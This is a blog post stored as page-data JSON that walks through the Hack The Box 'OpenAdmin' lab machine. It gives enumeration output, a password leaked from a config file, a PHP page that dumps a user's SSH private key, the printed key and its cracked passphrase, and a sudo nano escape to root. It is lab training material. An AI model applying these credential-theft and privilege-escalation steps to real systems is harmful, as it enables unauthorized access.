{"componentChunkName":"component---src-components-blog-entry-js","path":"/2020-02-12-HTB-OpenAdmin/","result":{"data":{"markdownRemark":{"html":"<h1>Nmap</h1>\n<pre><code>22/tcp    open     ssh              OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)\n|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)\n|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)\n80/tcp    open     http             Apache httpd 2.4.29 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: POST OPTIONS HEAD GET\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n10000/tcp filtered snet-sensor-mgmt\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n<h2>Findings</h2>\n<p>There is an opennet admin application that is running at <code>http://10.10.10.171/ona/</code>. The version is <code>18.1.1</code>\nThis version is vulnerable to <a href=\"https://www.exploit-db.com/exploits/47691\">RCE</a>. This will be used for the initial foothold.\nWith this foothold the next step is to enumerate to elevate privileges from <code>www-data</code>.  There are 2 users accounts avialable\n<code>jimmy</code>\n<code>joana</code></p>\n<p>Further enumeration will lead to <code>database_settings.inc.php</code> that contains a password. This  password can be used to log in as the user <code>jimmy</code> via ssh.</p>\n<pre><code>$ cat /opt/ona/www/local/config/database_settings.inc.php\n&#x3C;?php\n\n$ona_contexts=array (\n  'DEFAULT' => \n  array (\n    'databases' => \n    array (\n      0 => \n      array (\n        'db_type' => 'mysqli',\n        'db_host' => 'localhost',\n        'db_login' => 'ona_sys',\n        'db_passwd' => 'n1nj4W4rri0R!',\n        'db_database' => 'ona_default',\n        'db_debug' => false,\n      ),\n    ),\n    'description' => 'Default data context',\n    'context_color' => '#D3DBFF',\n  ),\n);\n</code></pre>\n<p>From this account we need to pivot to the joana account. Further enumeration is needed. <a href=\"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\">LinPeas</a> to the rescue.</p>\n<p>The following ports can be found open locally.</p>\n<pre><code>[+] Active Ports\n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0   5924 10.10.10.171:22         10.10.15.26:48630       ESTABLISHED -                   \ntcp        0      0 10.10.10.171:22         10.10.14.212:56442      ESTABLISHED -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      -                   \ntcp6       0      0 10.10.10.171:80         10.10.14.212:60184      TIME_WAIT   -                   \nudp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   \n</code></pre>\n<p>Requesting this page locally, you will see that it is a login form.  Looking at the apache config you can see that the files rendered are in <code>var/www/internal/</code> running under the context of the user joana.</p>\n<pre><code>jimmy@openadmin:/var/www/internal$ cd /etc/apache2/sites-available/\njimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf \nListen 127.0.0.1:52846\n\n&#x3C;VirtualHost 127.0.0.1:52846>\n    ServerName internal.openadmin.htb\n    DocumentRoot /var/www/internal\n\n&#x3C;IfModule mpm_itk_module>\nAssignUserID joanna joanna\n&#x3C;/IfModule>\n\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n&#x3C;/VirtualHost>\n</code></pre>\n<p>A file within the internal directory, leaks the ssh key of the user <code>joana</code> </p>\n<pre><code>jimmy@openadmin:/var/www/internal$ cat main.php \n&#x3C;?php session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /index.php\"); }; \n# Open Admin Trusted\n# OpenAdmin\n$output = shell_exec('cat /home/joanna/.ssh/id_rsa');\necho \"&#x3C;pre>$output&#x3C;/pre>\";\n?>\n&#x3C;html>\n&#x3C;h3>Don't forget your \"ninja\" password&#x3C;/h3>\nClick here to logout &#x3C;a href=\"logout.php\" tite = \"Logout\">Session\n&#x3C;/html>\n</code></pre>\n<p>Retrieving this file directly exposes the ssh key.</p>\n<pre><code>jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/n.php\n&#x3C;pre>-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D\n\nkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8\nad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO\nShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE\n6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ\nZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du\ny8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI\n9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4\npiC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/\n/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH\n40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ\nfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb\n9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80\nX1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg\nS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F\nFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh\nTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa\nRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z\nuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr\n1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2\nXGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79\nyPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM\n+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt\nqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt\nz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe\nK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN\n-----END RSA PRIVATE KEY-----\n&#x3C;/pre>&#x3C;html>\n&#x3C;h3>Don't forget your \"ninja\" password&#x3C;/h3>\nClick here to logout &#x3C;a href=\"logout.php\" tite = \"Logout\">Session\n&#x3C;/html>\n</code></pre>\n<p>The key requires a password. JTR is used to crack the password of the key. <code>bloodninjas</code></p>\n<pre><code>joanna@openadmin:~$ id\nuid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)\njoanna@openadmin:~$ cat user.txt \nc9b2cf07d40807e62af62660f0c81b5f\njoanna@openadmin:~$ \n</code></pre>\n<p>Now to elevate to root,  as you should always do check to see what executeable you can execute with sudo priveleges. </p>\n<pre><code>joanna@openadmin:~$ sudo -l\nMatching Defaults entries for joanna on openadmin:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser joanna may run the following commands on openadmin:\n    (ALL) NOPASSWD: /bin/nano /opt/priv\njoanna@openadmin:~$ sudo /bin/nano /opt/priv\n</code></pre>\n<p>From within nano attempt to read a file <code>^R</code> followed by <code>^X</code> to execute a command.  From here you can execute <code>cat /root/root.txt</code></p>","frontmatter":{"path":"/htb-openadmin","title":"Hack The Box - OpenAdmin","date":"02/12/2020","featuredImage":{"childImageSharp":{"fluid":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAADKUlEQVQ4y4WTW2hUVxSGT8zFzMyZmUwmM3Nm5pw5c8tkNNE8eJnamL6YCLFjVBRbCCpaBttoLJg0oFD0wUoUmmhSbclLMbReKWqxXoiChBJpSykRL3hBhdZKK7TSptWC8HWdMyr0pT787M1ea/97rf2vX3GpblTVg9vrodLhZoqiUl7iokwRlKpYcbfHY692rtuD06XicLpsVDqc9vo8plhkqlywLkdMPwtW6ry+cQb5t7PkWjR5rIqpU9VnpEViX7WfkBYmGNLQDcPee6t8dkyxEsvL3LyaN+n9vJWuE9vZcbKHni+2sulEFxv2zCKaCBRJvV67omQqRduiRcyf38yCloXkXpmHrht2TCmXyua0xth+Mk/78CkGRi/w5GI7Vw6upOPwDxQ+20X3cA5/sFpaUwkbJrqZwkjUkkhnmVY/g3RdPWaqDi0aQ6ny+ejcl6Nt9wCbRn/i9KXTTE4c5OH4MINj43SMXObNfQUWF9KUlqgENI2oESci0GNxstOTRGMmwbCOPxBCmTkvzJqhPNltx+n/7h4Xrt3g6d1Rfrl+nqNX7rH+y6tkNu/knf7ZtnhV8n+GmSAWTxEKRwnHq4XIL+c1eH3VKM3tBit2LSe4+Rh9X99k9NZ9/r5xhh8njvLV7Z9ZeuBbgoWdbBxqwlfjJRyN2+1lpjeSztaTytYSS2Tss0gsgdLYFGHtYBuVq/bSfWaCO4/+4J+/HvLk0VW+uf+Axr5zxNf10DkwR8bCi0tGwx8I2u3WSIsBUVqTSrWIbscVn99H1/65zOrdxnvf3+XB5G88fjwp+JNLv/9K68g4S3a8wbLOOvsPNVHTkHbjUpElSjIzjdpsg1TbIKRGUeXcQp0Pxt5i7dmz7PlkhP6+DxnavZfC/sN0jR2g99NmEUNUdliihAnJRQsRUTwqbRpmUpRPSLURGWyZw4pyN68ti7P1WBuHTr3Lx4PreV/Qe2Q1Gz6ai5kJUlFRHG7LJUW4cD5zi8NZdIt1rlh2UT1urEqNdA0tq5N0bGlkRXcDTXlDHCBOqVBf2M/O/x8oz5NsL1eqlFpeFvKyKbIvcf3Hyy8js/Avcyq9x4dTcxYAAAAASUVORK5CYII=","aspectRatio":1.5748031496062993,"src":"/static/23ac7b74ba06914abac7f1103e9763cd/ee604/openadmin.png","srcSet":"/static/23ac7b74ba06914abac7f1103e9763cd/69585/openadmin.png 200w,\n/static/23ac7b74ba06914abac7f1103e9763cd/497c6/openadmin.png 400w,\n/static/23ac7b74ba06914abac7f1103e9763cd/ee604/openadmin.png 800w,\n/static/23ac7b74ba06914abac7f1103e9763cd/d8f5a/openadmin.png 1192w","sizes":"(max-width: 800px) 100vw, 800px"}}}}}},"pageContext":{}}}